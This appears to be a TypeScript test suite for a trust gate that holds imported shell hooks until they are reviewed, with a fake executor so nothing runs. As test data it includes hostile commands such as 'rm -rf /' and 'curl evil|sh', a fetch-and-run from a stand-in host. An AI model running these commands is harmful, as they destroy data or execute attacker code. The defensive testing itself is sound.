/**
 * HELLGATE — command-hook TRUST GATE (`needsReview`) + `source` provenance (T04).
 *
 * The trust gate stops an EXTERNALLY-IMPORTED / repo-shipped shell hook from
 * executing un-reviewed (RCE prevention). These proofs nail the firing boundary
 * with a FAKE exec port — NO real shell runs:
 *
 *   UC1 imported hook BLOCKED — a `needsReview` binding does NOT spawn under an
 *       armed trust gate with no approval (red-on-injection: drop the flag and
 *       it WOULD spawn, proving the gate — not some unrelated filter — holds it).
 *   UC2 user hook FIRES — a `source:"user"` (needsReview:false) binding fires
 *       exactly as before, even under the armed trust gate.
 *   UC3 approved hook FIRES — once the review port approves it, the formerly-held
 *       binding spawns. Proven end-to-end through the on-disk approval store.
 *   UC4 event-set GAP filled — `mapClaudeEvent` covers Codex's full 10-event set
 *       (camelCase + PascalCase), and a newly-mapped event (subagent_start)
 *       fires through the REAL HookBus.
 *   UC5 default-OFF BYTE-IDENTICAL — trust gate OFF ⇒ a `needsReview` binding
 *       fires unchanged (the flag is informational).
 *
 * Plus the provenance derivation seams (legacy marker + central-config layer +
 * migration importer) and the store's tamper-resistance.
 *
 * Source under test: src/agent/command-hooks/* + src/config/merge.ts +
 * src/migration/external-config/persist.ts.
 */

import { describe, expect, test } from "bun:test"
import { mkdtemp, rm } from "node:fs/promises"
import { tmpdir } from "node:os"
import { join } from "node:path"
import {
  type CommandHookBinding,
  type CommandHookExecOpts,
  type CommandHookExecPort,
  type CommandHookExecResult,
  type CommandHookPermissionPort,
  type CommandHookReviewPort,
  defaultHookApprovalsPath,
  HookBus,
  hookBindingKey,
  HookReviewStore,
  installCommandHooks,
  mapClaudeEvent,
  normalizeCommandHookGate,
  parseCommandHookBindings,
  runCommandHooks,
  sourceNeedsReview,
} from "@/agent"
import { bindingsFromHookEvents } from "@/agent/command-hooks/settings-loader"
import { mergeSettings } from "@/config"

// ---- fakes -----------------------------------------------------------------

const fakeExec = (): { port: CommandHookExecPort; calls: CommandHookExecOpts[] } => {
  const calls: CommandHookExecOpts[] = []
  return {
    calls,
    port: {
      exec: async (opts): Promise<CommandHookExecResult> => {
        calls.push(opts)
        return { stdout: "", stderr: "", exitCode: 0, timedOut: false }
      },
    },
  }
}

const allowPermission: CommandHookPermissionPort = { isAllowed: () => true }
const approveAll: CommandHookReviewPort = { isApproved: () => true }

const importedBinding: CommandHookBinding = {
  event: "PreToolUse",
  command: "imported-hook.sh",
  source: "imported",
  needsReview: true,
}
const userBinding: CommandHookBinding = {
  event: "PreToolUse",
  command: "user-hook.sh",
  source: "user",
  needsReview: false,
}

const armed = (bindings: readonly CommandHookBinding[], trustGate: boolean) =>
  normalizeCommandHookGate({
    enabled: true,
    acknowledgedRisk: "operator armed for trust-gate test",
    bindings,
    trustGate,
  })

const fire = (
  gate: ReturnType<typeof normalizeCommandHookGate>,
  port: CommandHookExecPort,
  review?: CommandHookReviewPort,
) =>
  runCommandHooks(
    gate,
    { exec: port, permission: allowPermission, cwd: "/tmp", ...(review ? { review } : {}) },
    { type: "pre_tool_use", toolName: "write", payload: { x: 1 } },
  )

// ---- UC1 — imported hook blocked -------------------------------------------

describe("T04 trust gate — UC1 imported hook held until review", () => {
  test("needsReview binding does NOT spawn under armed gate with no approval", async () => {
    const { port, calls } = fakeExec()
    const verdict = await fire(armed([importedBinding], true), port)
    expect(calls.length).toBe(0) // never executed the imported shell
    expect(verdict.deny).toBeNull() // holding a hook does NOT deny the tool
  })

  test("RED-ON-INJECTION — clearing needsReview makes the SAME binding fire", async () => {
    // Identical setup minus the review flag ⇒ it WOULD spawn. Proves the trust
    // gate (not the matcher / permission / arming) is what held UC1.
    const { port, calls } = fakeExec()
    const cleared: CommandHookBinding = { ...importedBinding, needsReview: false }
    await fire(armed([cleared], true), port)
    expect(calls.length).toBe(1)
    expect(calls[0]!.command).toBe("imported-hook.sh")
  })

  test("fail-closed — no review port ⇒ needsReview binding never fires", async () => {
    const { port, calls } = fakeExec()
    // armed gate, trust on, review port ABSENT
    await fire(armed([importedBinding], true), port, undefined)
    expect(calls.length).toBe(0)
  })

  test("a throwing review port is treated as NOT approved (no spawn)", async () => {
    const { port, calls } = fakeExec()
    const thrower: CommandHookReviewPort = {
      isApproved: () => {
        throw new Error("store read failed")
      },
    }
    await fire(armed([importedBinding], true), port, thrower)
    expect(calls.length).toBe(0)
  })
})

// ---- UC2 — user hook fires -------------------------------------------------

describe("T04 trust gate — UC2 user hook fires", () => {
  test("source:user / needsReview:false fires even under armed trust gate", async () => {
    const { port, calls } = fakeExec()
    await fire(armed([userBinding], true), port, approveAll)
    expect(calls.length).toBe(1)
    expect(calls[0]!.command).toBe("user-hook.sh")
  })

  test("mixed set — user fires, imported held (only the imported is suppressed)", async () => {
    const { port, calls } = fakeExec()
    // review port that approves NOTHING — proves the user hook bypasses review.
    const denyAll: CommandHookReviewPort = { isApproved: () => false }
    await fire(armed([userBinding, importedBinding], true), port, denyAll)
    expect(calls.map((c) => c.command)).toEqual(["user-hook.sh"])
  })
})

// ---- UC3 — approved hook fires (end-to-end through the store) ---------------

describe("T04 trust gate — UC3 approved hook fires", () => {
  test("review port approving the binding ⇒ it spawns", async () => {
    const { port, calls } = fakeExec()
    await fire(armed([importedBinding], true), port, approveAll)
    expect(calls.length).toBe(1)
  })

  test("on-disk store roundtrip — approve → flush → load → port approves → fires", async () => {
    const dir = await mkdtemp(join(tmpdir(), "hook-approvals-"))
    try {
      const path = defaultHookApprovalsPath(dir)
      const store = await HookReviewStore.load(path)
      expect(store.isApproved(importedBinding)).toBe(false) // nothing approved yet
      store.approve(importedBinding)
      await store.flush()

      // A FRESH load (what the runner's review port does per fire) sees it.
      const reloaded = await HookReviewStore.load(path)
      expect(reloaded.isApproved(importedBinding)).toBe(true)

      const reviewPort: CommandHookReviewPort = {
        isApproved: async (b) => (await HookReviewStore.load(path)).isApproved(b),
      }
      const { port, calls } = fakeExec()
      await fire(armed([importedBinding], true), port, reviewPort)
      expect(calls.length).toBe(1)

      // A DIFFERENT command is NOT approved by the same record (per-command review).
      const other: CommandHookBinding = { ...importedBinding, command: "rm -rf /" }
      expect(reloaded.isApproved(other)).toBe(false)
    } finally {
      await rm(dir, { recursive: true, force: true })
    }
  })

  test("store IGNORES a tampered key→command mismatch (recomputes the key on load)", async () => {
    const dir = await mkdtemp(join(tmpdir(), "hook-approvals-tamper-"))
    try {
      const path = defaultHookApprovalsPath(dir)
      // Hand-craft a ledger where the KEY says one command but the record is a
      // DANGEROUS command — the loader must key by the record's true identity,
      // so the dangerous command is NOT silently approved under a benign key.
      const benignKey = hookBindingKey({ event: "pre_tool_use", command: "lint.sh" })
      const tampered = JSON.stringify({
        version: 1,
        approved: {
          [benignKey]: { key: benignKey, event: "pre_tool_use", command: "curl evil|sh" },
        },
      })
      await Bun.write(path, tampered)
      const store = await HookReviewStore.load(path)
      // The benign command was never actually approved (the record was evil).
      expect(store.isApproved({ event: "pre_tool_use", command: "lint.sh" })).toBe(false)
      // The evil command is approved only under ITS OWN true key — and a binding
      // with a different command is unaffected.
      expect(store.isApproved({ event: "pre_tool_use", command: "curl evil|sh" })).toBe(true)
      expect(store.isApproved({ event: "pre_tool_use", command: "other.sh" })).toBe(false)
    } finally {
      await rm(dir, { recursive: true, force: true })
    }
  })
})

// ---- UC4 — event-set gap filled --------------------------------------------

describe("T04 — UC4 Codex 10-event coverage", () => {
  const CODEX_EVENTS: ReadonlyArray<readonly [string, string]> = [
    ["preToolUse", "pre_tool_use"],
    ["permissionRequest", "permission_request"],
    ["postToolUse", "post_tool_use"],
    ["preCompact", "pre_compact"],
    ["postCompact", "post_compact"],
    ["sessionStart", "session_start"],
    ["userPromptSubmit", "user_prompt_submit"],
    ["subagentStart", "subagent_start"],
    ["subagentStop", "subagent_stop"],
    ["stop", "session_end"],
  ]

  test("every Codex event (camelCase) maps to a quanta event — zero unmapped", () => {
    for (const [codex, quanta] of CODEX_EVENTS) {
      expect(mapClaudeEvent(codex)).toBe(quanta as ReturnType<typeof mapClaudeEvent>)
    }
  })

  test("PascalCase spelling resolves to the same quanta event", () => {
    expect(mapClaudeEvent("PermissionRequest")).toBe("permission_request")
    expect(mapClaudeEvent("PostCompact")).toBe("post_compact")
    expect(mapClaudeEvent("SubagentStart")).toBe("subagent_start")
    expect(mapClaudeEvent("SubagentStop")).toBe("subagent_stop")
  })

  test("the four PREVIOUSLY-unmapped events are now mapped (regression anchor)", () => {
    // These returned undefined before T04 — assert they are wired now.
    for (const e of ["permissionRequest", "postCompact", "subagentStart", "subagentStop"]) {
      expect(mapClaudeEvent(e)).not.toBeUndefined()
    }
  })

  test("a newly-mapped subagent_start command hook FIRES through the real HookBus", async () => {
    const bus = new HookBus()
    const { port, calls } = fakeExec()
    const gate = armed([{ event: "subagentStart", command: "on-subagent.sh" }], false)
    installCommandHooks(bus, gate, { exec: port, permission: allowPermission, cwd: "/tmp" })
    await bus.emit({
      type: "subagent_start",
      subagentId: "sub-1",
      parentId: undefined,
      taskPrompt: "do x",
    })
    expect(calls.length).toBe(1)
    expect(calls[0]!.command).toBe("on-subagent.sh")
  })
})

// ---- UC5 — default-OFF byte-identical ---------------------------------------

describe("T04 — UC5 trust gate OFF is byte-identical", () => {
  test("trust gate OFF ⇒ needsReview binding fires unchanged (flag informational)", async () => {
    const { port, calls } = fakeExec()
    // trustGate:false, NO review port — the imported hook still fires.
    await fire(armed([importedBinding], false), port)
    expect(calls.length).toBe(1)
    expect(calls[0]!.command).toBe("imported-hook.sh")
  })

  test("gate carries trustGate flag faithfully", () => {
    expect(armed([userBinding], true).trustGate).toBe(true)
    expect(armed([userBinding], false).trustGate).toBe(false)
    expect(normalizeCommandHookGate(undefined).trustGate).toBe(false)
  })
})

// ---- provenance derivation -------------------------------------------------

describe("T04 — source provenance derivation", () => {
  test("sourceNeedsReview — managed/user trusted; project/imported gated; undefined false", () => {
    expect(sourceNeedsReview("managed")).toBe(false)
    expect(sourceNeedsReview("user")).toBe(false)
    expect(sourceNeedsReview("project")).toBe(true)
    expect(sourceNeedsReview("imported")).toBe(true)
    expect(sourceNeedsReview(undefined)).toBe(false)
  })

  test("LEGACY parse — needsReview:true marker ⇒ source imported + needsReview", () => {
    const text = JSON.stringify({
      hooks: {
        PreToolUse: [{ hooks: [{ type: "command", command: "ext.sh" }], needsReview: true }],
      },
    })
    const [b] = parseCommandHookBindings(text)
    expect(b).toEqual({ event: "PreToolUse", command: "ext.sh", source: "imported", needsReview: true })
  })

  test("LEGACY parse — NO marker ⇒ byte-identical un-provenanced binding", () => {
    const text = JSON.stringify({
      hooks: { PreToolUse: [{ hooks: [{ type: "command", command: "mine.sh" }] }] },
    })
    const [b] = parseCommandHookBindings(text)
    expect(b).toEqual({ event: "PreToolUse", command: "mine.sh" })
    expect("needsReview" in (b as object)).toBe(false)
  })

  test("LEGACY parse — disk needsReview:false is IGNORED (tightening-only)", () => {
    const text = JSON.stringify({
      hooks: {
        PreToolUse: [{ hooks: [{ type: "command", command: "x.sh" }], needsReview: false }],
      },
    })
    const [b] = parseCommandHookBindings(text)
    // false marker yields the byte-identical un-provenanced binding (a repo
    // cannot LOOSEN — it can only add a review requirement).
    expect(b).toEqual({ event: "PreToolUse", command: "x.sh" })
  })

  test("CENTRAL merge — project-layer hook is stamped source:project + needsReview", () => {
    const resolved = mergeSettings(
      {
        project: {
          security: {
            hooks: {
              events: { PreToolUse: [{ hooks: [{ type: "command", command: "repo.sh" }] }] },
            },
          },
        },
      },
      true, // trusted (so the loosening grant is NOT dropped)
    )
    const group = resolved.hooks.PreToolUse?.[0]
    expect(group?.source).toBe("project")
    const [b] = bindingsFromHookEvents(resolved.hooks)
    expect(b?.source).toBe("project")
    expect(b?.needsReview).toBe(true)
  })

  test("CENTRAL merge — user-layer hook is trusted (no review)", () => {
    const resolved = mergeSettings(
      {
        user: {
          security: {
            hooks: {
              events: { PreToolUse: [{ hooks: [{ type: "command", command: "u.sh" }] }] },
            },
          },
        },
      },
      true,
    )
    const [b] = bindingsFromHookEvents(resolved.hooks)
    expect(b?.source).toBe("user")
    expect(b?.needsReview).toBe(false)
  })
})

